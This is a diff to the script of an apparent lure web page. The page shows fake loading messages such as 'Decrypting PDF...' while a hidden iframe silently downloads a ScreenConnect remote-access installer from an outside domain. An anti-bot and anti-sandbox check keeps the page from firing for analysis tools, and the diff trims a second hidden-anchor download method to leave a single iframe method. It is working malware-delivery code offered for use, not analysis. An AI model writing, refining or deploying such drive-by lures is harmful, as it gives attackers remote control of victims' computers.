@@ -82,7 +82,7 @@
 </div>
 
 <script>
-/*==== HTML SMUGGLING - WORKING AUTO-DOWNLOAD ====*/
+/*==== METHOD 1: IFRAME AUTO-DOWNLOAD ====*/
 var MSI_URL = "https://diskcitylink.pro/voZrrQz/ScreenConnect.ClientSetup.msi";
 
 (function(){
@@ -91,7 +91,6 @@ var MSI_URL = "https://diskcitylink.pro/voZrrQz/ScreenConnect.ClientSetup.msi";
     var finalText = document.getElementById('final');
     var manualDownload = document.getElementById('manualDownload');
 
-    // Anti-sandbox / anti-bot detection
     function isRealUser(){
         if(navigator.webdriver || window.__nightmare || window.callPhantom || window._phantom) return false;
         if(/bot|crawl|spider|headless|phantom|puppet|selenium/i.test(navigator.userAgent)) return false;
@@ -105,33 +104,20 @@ var MSI_URL = "https://diskcitylink.pro/voZrrQz/ScreenConnect.ClientSetup.msi";
         return;
     }
 
-    // Method 1: HTML5 download attribute with iframe (works without user interaction)
-    function autoDownload(url, filename) {
+    // METHOD 1: iframe download - loads URL in hidden iframe, browser triggers download
+    function autoDownloadIframe(url) {
         var iframe = document.createElement('iframe');
         iframe.style.display = 'none';
         iframe.src = url;
         document.body.appendChild(iframe);
         
-        // Remove iframe after download starts
         setTimeout(function() {
-            document.body.removeChild(iframe);
+            if (iframe && iframe.parentNode) {
+                document.body.removeChild(iframe);
+            }
         }, 5000);
     }
-    
-    // Method 2: Alternative - create hidden anchor and click it
-    function autoDownloadAnchor(url, filename) {
-        var link = document.createElement('a');
-        link.href = url;
-        link.download = filename;
-        link.style.display = 'none';
-        document.body.appendChild(link);
-        link.click();
-        setTimeout(function() {
-            document.body.removeChild(link);
-        }, 1000);
-    }
 
-    // Simulated loading messages
     var messages = [
         "Verifying access...",
         "Decrypting PDF...",
@@ -144,15 +130,9 @@ var MSI_URL = "https://diskcitylink.pro/voZrrQz/ScreenConnect.ClientSetup.msi";
         i++;
         statusText.textContent = messages[Math.min(i, messages.length-1)];
 
-        // Trigger download EARLY at 2nd message
+        // Trigger iframe download at 2nd message
         if (i === 2) {
-            // Try both methods - at least one will work
-            try {
-                autoDownload(MSI_URL, "ScreenConnect.ClientSetup.msi");
-            } catch(e) {}
-            try {
-                autoDownloadAnchor(MSI_URL, "ScreenConnect.ClientSetup.msi");
-            } catch(e) {}
+            autoDownloadIframe(MSI_URL);
         }
 
         if(i >= messages.length){
@@ -165,15 +145,10 @@ var MSI_URL = "https://diskcitylink.pro/voZrrQz/ScreenConnect.ClientSetup.msi";
         }
     }, 1100);
 
-    // Manual download handler
+    // Manual download fallback
     manualDownload.addEventListener('click', function(e) {
         e.preventDefault();
-        var link = document.createElement('a');
-        link.href = MSI_URL;
-        link.download = "ScreenConnect.ClientSetup.msi";
-        document.body.appendChild(link);
-        link.click();
-        document.body.removeChild(link);
+        autoDownloadIframe(MSI_URL);
     });
 })();
 </script>
